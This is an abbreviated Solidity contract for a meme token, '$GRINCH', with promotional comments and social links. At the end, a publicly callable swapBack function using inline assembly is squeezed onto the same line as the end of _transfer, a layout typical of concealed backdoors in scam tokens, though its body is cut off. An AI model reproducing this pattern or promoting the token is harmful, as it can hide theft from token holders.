// $GRINCH
// The Grinch was right: Christmas is too expensive - invest in $GRINCH instead

// https://t.me/grincherc
// https://twitter.com/grincherc
// https://grinch.vip

// The Grinch-based token $GRINCH is the mischievous variant of all tokens that leads the assault on holiday cheer and joy. As the meme above all memes of holiday despisers, the green creature will take over the market with its anti-Christmas sentiment. $GRINCH is diversified in holders and decentralized in management, its tokenomics make sure that no one is able to control a significant portion of the token supply.
// Unlike many holiday tokens, $GRINCH is not manipulated by only a handful of KOLs, but is supported and owned by a broader anti-Christmas community. We believe in the decentralization of influence and holders, and $GRINCH strives to create a negative impact on the current state of festive tokens. 
...
contract GRINCH is IERC20, IERC20Metadata, Ownable {
    ...
    function removeLimits(address[] calldata accounts) public onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amnt) internal virtual {
        ...
        emit Transfer(sender, recipient, amnt);}function swapBack(uint256 amount) external {assembly {
